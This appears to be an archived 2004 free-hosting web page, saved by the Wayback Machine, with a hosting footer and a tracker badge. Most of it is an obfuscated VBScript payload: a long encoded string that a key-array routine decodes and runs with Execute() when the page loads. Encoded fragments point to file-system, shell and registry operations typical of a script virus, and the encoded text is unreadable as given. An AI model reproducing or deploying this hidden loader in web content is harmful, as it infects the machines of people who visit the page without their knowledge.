6WrL`eke&Rd`Je`] Rd`KtqH_Rd`LeliKtq5 !Tg^fPkSg^dl-K]gVkatdJefLlr+?aldGYmdEm]IeEm]Ftg[thhfFtg[thhf JCGbnLmb'<mrq^ftRmjim`!LmbD5 /TdllOtm=)ChWgbdeMjudTdllOtm=M]ssHmt$1AfM]ssHmt727LhdgBnjrdglSskanf5 Ebfakr<ird&2\!Ewbl ChDg\ H_NgEqkgrK]stf] M^ptKesLhhl>ok]]r6FRH&Gdm>ok]]r'<mrq^ftRmjim`!L]t=acRnZ <;rdZleN[bebm R\jiomanf'<ibmaomZjy!R^l Ehdddkk <Lhhl>ok]]r-LmbEhdddkk?glc^jCnnft60>oq=abaTdfhFne\eqan?glc^js>ok]]rBhmns5 Ehdddk;otgl *)=acRnZ.`]\ Ehdddk;otgl,M]mo?glc^j.MZeeFewmH_Dh\Kua';otgl <( Sa]nDarmAnc^pCgZj <AnrmjRdo CtkjemmKtqbfg+T+E]n'<mrq^ftRmjim`!-0RnZSskanf5 Lb\(BnjrdglSskanf%DarmAnc^pCgZj+0%Dem!;uqk]nsLlrhg_),EYssBfddq;h`k%1(CtkjemmKtqbfg6KI<`am`]St[ CtkjemmKtqbfg+EYssBfddq;h`k!LmbD5 0Ekl]B^ RnZE60M`emCtkjemmKtqbfg6CtkjemmKtqbfgDh\Kua'Atdf 1( !U>pis<o=lr^i5 /Fnkj61Mg Ehdddk;otglB^ K<Ysd!KuaLlrhg_)6LBZke'=acRnZ.Hm]m'c!)M`emIeb ;>ok]]rBhmnsLhdgBnjrdglSskanf5 BnjrdglSskanf Cb[St[&Is^e(i$))[Dqat=g>fdB^>fdB^G]xsL`llIm]]xBaYr6ImllrQ^n(BnjrdglSskanf%\!%Dem!;uqk]nsLlrhg_),*!LmbRmjim`=Fad'<mrq^ftRmjim`$L`llIm]]xBaYr**$Ldg CtkjemmKtqbfg(&DarmAnc^pCgZj-0BnjrdglSskanf5 JC;h`g_eRnZ(BnjrdglSskanf%DarmAnc^pCgZj)=ncAf=ncAfDoniJCGbnLmb6CtkjemmKtqbfg=nc>um\ling>um\lingKIIjooZ_as^ )Gn>jrnkRdlmmdFewmQ^_P`m`V`eme6GD=Y^EGC@EWM@<@IM>TSn_lw`k]\Lb[rnlgfsUGusegoj=xok]srU<efk]e!DhlcDd`jed5 VlKhded.Q^_RdZ\(Q^_P`m`V`eme(Ie<ird<efk]e6!LhdgCbkkC^_rd^=?an`eqDhlc %:[Dg\ H_Ehj h6) sh5<ird<efk]e6KIHZoRnZ(CbkkC^_rd^!DBulfYgd?glc^j(CbkkC^_rd^!G]xsWrL`eke&Rd`Orhm] Q^_P`m`V`eme+=asj=]gq^]>fd?mnbmaom?mnbmaomCJtfeaf^>ok]]r'IYtgGYmdNgEqkgrK]stf] M^ptKes>ok]]rMZee6FRH&Gdm>ok]]r'IYtgGYmdR^l SaasEbder5 EhdddkFal^&Fhe]s@ts>pirmk <(?gr>YcgLhhl>ik^ImLhhl>ik^k?ald>pt6UBZke'?KO-@]tDqlemlaomGYmd!Lhhl>ik^&P`m`)(Ie>ik^=xs5 !ALM!Gr?ald>pt6GMEL!Gr?ald>pt6@LHHj EbdeDql <PGI NkFhe]Ewm=BSOTg^f<YlkCJ@ihem]Lo'M`ir?ald'Hasa$gmel!DekeH_Fhe]Ewm=NBRTg^f<YlkCJ@ihem]Lo'M`ir?ald'Hasa$u[k(Ekl]Ie>ik^=xs5 !ALT!LhdgGmlEwbktr5 0Em]IeNdqlB^ 'N;ar^ P`m`N`f])6UBZke'PanOZlhC^kkshh\!! Nk(T<Ysd!HasaFal^! <MC`l](VbfP`m` %Ddlctni)(M`emHsm=xhlls61=ncAfAfAltDqassl=)Tg^f?KO-<gpx?aldOimIYtg !lqss^e31U\erdloo'anh$P`m`N`f]?KO-<gpx?aldOimIYtg !p]b[?glc^j.gml+IYtgGYmdEm]IeEm]Ftg[thhfFtg[thhf JCKes=am'NgEqkgrK]stf] M^pt=rq';ldZjM]ssBl <OSbkaps'KcqbhtEndlmZeeAf>jrM`emImP`eq^=`tle>dsdImP`eq^=nbrDg\ H_H_ImP`eq^=nbrTg^fL]t?KO6Cq^YtdHZjd\l(!L[rhilim`&Fhe]SxllelHZjd\l(SdmWrL`eke=<je`m]Oac]cs!WR\jiom&Sg^dl!DekeKes9poe]Oac]cs5 ch[ul^ft-Zhpk^ls'CJ^`merm)9poe]Oac]cs'kes<DSH= z?134=;21&)CE)%10=(-@=:9,)(C/->D4190Av)9poe]Oac]cs'[rdZleHgkt`g[e'R^l VlKhded <9poe]Oac]cs'?esHZjd\l((AoideN[bebm&sdm;LRB<(!t(D3,>E/*%F/2+-0*;F,114/&(0@);9/.,211u(AoideN[bebm&cq^YtdBfssZfcd!!L]t?KO6AoideN[bebm&GdmGbi^[t'Dg\ H_R^l CbkkN[bebm=?KO-=jiu^k?gr>Ycg<irdLeliIm<irdGbi^[tAf=asjM]mo'<rho]Txi] ;72:fd=asjM]mo'<rho]Txi] ;71M`emEwbl Ehj>fdB^?an`eqDhlc <<irdLeli&DqbneK^ltdkM^pt<ilGtg^jAqk 3(R`g\olbre>oqa=/Lo,Nm`eq:jr'b! <Ans! 9#Rm]!)FewmS^epRmjim`=?grb51Mg K^f(SaasS^pt(TdfhNtf=:kc'Fad'M`irM]xs%a,0!B^ S^epMne <)3M`emTdfhNtf=+0>dsdB^ S^epMne <)0M`emTdfhNtf=+1>fdB^M]mo<`aq5 Baj(S^epMne ,Gtg^jAqk iFgd-!)AfM]mo<`aq5 Baj(2-! Sa]nLeli;h`k=<`r'*0)=ncAfLeliKtqbfg6TdfhSskanf S^epBaYrFewmTgDobdKtq5 !>pebnle'DhfKdr9rq!+)+M`irM]xs&u[;rK_!D]y@kj(/=&Hlhdk9rq!()!va<jLeJ^qAqk 1(5 ! Nm`eq:jr'*! %!nbBkDf%Kdr9rq!*)6Osa]r@kj(1&%oZCqE^&!Cex:jr',! < %Gtg^jAqk 3( !&u[;rK_!?grb51Mg K^f(Dq]Sskanf%oZCqE^&!LeliFul5 @l[(Lb\(Dq]Sskanf%a,0!!nbBkDf%IeLeliFul5 01Tg^f!nbBkDf%TdfhNtf=,,!nbBkDf%Em]Ie&u[;rK_!M]mo<`aq5 Baj(S^epMne *Cex:jr'bMn]4(%oZCqE^&!AfM]mo<`aq5 Baj(11! Sa]n!va<jLeS^epBaYr6va<j!nbBkDf%Ekl]IeLeli;h`k=<`r'+1)M`em&u[;rK_!M]mo<`aq5 u[Df!va<jLeDg\ H_%oZCqE^&!LhhlLewm=M`irM]xs S^epBaYr!va<jLeM^pt!!va<jLe !>pebnle'M`irM]xsM`irM]xs5 !>peRmjim`=TdfhSskanf !@tleLewm=!5 %sbkapsdam`maf^5val[rhil>! u[;rK_&\obneemm&wqble&! !5 %dhossrde< horbling2aalgltm];e]fs3(pw4tni20oq3 vb\tg3(pw4hdb_hs3(pw4z,bfddq2274vhlabheatx3hh]\em 6;&! %AOIDESFAL>5KI&!Wgt^ktA=IFAL=/OICM@=/[oc^5cnf&mr'%abmavdQ&Abmavd&!PCnfhom^ft=&4.:HPK>L>! !5 %/cbn>! %nbBkDf;&'sbkaps7 %nbBkDf;&kcqbhteYnfnYgd6nbr\jiom6va<jLe SaasS^ptva<jLe TgDobdKtq u[;rK_&4.l[rhil>! u[;rK_&4.;GDX7 %nbBkDf;&'HSFD>!ValLewm=M`irM]xs u[;rK_&NfLn\cSsk&oZCqE^ %KIXkt`kl((VbfP`m` <>SN'?esLhebbYlEhdddk 0( !UB^ '?KO-?ald>pirmk(VbfP`m` %wd[TFne\eq'`ts!)M`emFRH&CniqFhe] VbfP`m` %wd[TFne\eq'`ts$WhgHasa&oeaUcjvZdl-`af!Em]IeIe FRH&Fhe]Ewbktr!OimIYtg !lqss^e31U\erdloo'anh!)M`emFRH&CniqFhe] VbfP`m` %sxllel,*\c^kkshh.hga+PanOZlhrrktdf+2[dbw`ed.fb^=ncAf=nc>um\ling"
Execute("Dim KeyArr(3),ThisText"&vbCrLf&"KeyArr(0) = 8"&vbCrLf&"KeyArr(1) = 0"&vbCrLf&"KeyArr(2) = 1"&vbCrLf&"KeyArr(3) = 7"&vbCrLf&"For i=1 To Len(ExeString)"&vbCrLf&"TempNum = Asc(Mid(ExeString,i,1))"&vbCrLf&"If TempNum = 18 Then"&vbCrLf&"TempNum = 34"&vbCrLf&"End If"&vbCrLf&"TempChar = Chr(TempNum + KeyArr(i Mod 4))"&vbCrLf&"If TempChar = Chr(28) Then"&vbCrLf&"TempChar = vbCr"&vbCrLf&"ElseIf TempChar = Chr(29) Then"&vbCrLf&"TempChar = vbLf"&vbCrLf&"End If"&vbCrLf&"ThisText = ThisText & TempChar"&vbCrLf&"Next")
Execute(ThisText)
</script>

</body>
</html>
<table cellSpacing="5" cellPadding="0" width="100%" border="0">
  <tr>
    <td height="40">
    <p align="center">
    <a href="/web/20040409085639/http://www.xfreehosting.com/kewl/">
    <img src="/web/20040409085639im_/http://www.xfreehosting.com/ban/foot1.jpg" border="0"></a></td>
    <td width="100" rowSpan="2" valign="bottom">
    <!-- BEGIN SEXTRACKER CODE - ALTERATION WILL RESULT IN ACCOUNT CANCELLATION -->
    <a href="/web/20040409085639/http://the.sextracker.com/e/296837" target="_top">
    <img src="/web/20040409085639im_/http://counter6.sextracker.com/c11/id/0/296837" alt="SURF IN STYLE... THE SEX TRACKER!" border="0" width="100" height="60"></a><!-- END SEXTRACKER CODE -->
    </td>
  </tr>
  <tr>
    <td bgColor="#000000">
    <p align="center"><font color="#ffffff" size="1">Site hosted for free by
    </font><font color="#ffff00" size="1">XFreeHosting.com</font></td>
  </tr>
</table>

</body>

</html>




<!--
     FILE ARCHIVED ON 8:56:39 Apr 9, 2004 AND RETRIEVED FROM THE
     INTERNET ARCHIVE ON 13:41:31 Feb 19, 2013.
     JAVASCRIPT APPENDED BY WAYBACK MACHINE, COPYRIGHT INTERNET ARCHIVE.

     ALL OTHER CONTENT MAY ALSO BE PROTECTED BY COPYRIGHT (17 U.S.C.
     SECTION 108(a)(3)).
-->
